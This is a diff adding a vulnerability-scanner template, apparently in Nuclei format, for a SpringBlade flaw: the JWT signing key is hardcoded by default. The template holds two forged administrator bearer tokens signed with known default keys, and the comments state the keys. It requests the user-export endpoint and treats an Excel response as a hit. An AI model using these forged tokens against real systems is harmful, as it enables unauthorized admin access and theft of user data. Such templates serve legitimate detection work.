@@ -1,0 +1,36 @@
+id: SpringBlade-export-user
+
+info:
+  name: SpringBlade jwt默认密钥硬编码漏洞
+  author: sec
+  severity: high
+  description: https://forum.butian.net/share/973
+  tags: jwt
+
+http:
+  - raw:   
+      - |
+        GET /api/blade-user/export-user HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        {{jwt}}
+        Connection: close
+
+    payloads:
+      jwt:
+        # 默认密钥：bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
+        - "Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
+        # 默认密钥：BladeX
+        - "Blade-Auth: bearer eyJ0eXAiOiJKc29uV2ViVG9rZW4iLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwibmlja19uYW1lIjoi566h55CG5ZGYIiwiYWNjb3VudCI6ImFkbWluIiwidGVuYW50X2NvZGUiOiIwMDAwMDAiLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6OTk5OTk5OTk5OSwibmJmIjoxNTU3ODgxODg0fQ.tUgcE7QGzhe1nm_lT6aoMpZSdXKKNJyMBTMybd5RkWQ"
+    
+    attack: batteringram
+    threads: 5
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body) > 100'
+          - 'status_code == 200'
+          - 'contains(header, "application/vnd.ms-excel")'
+        condition: and
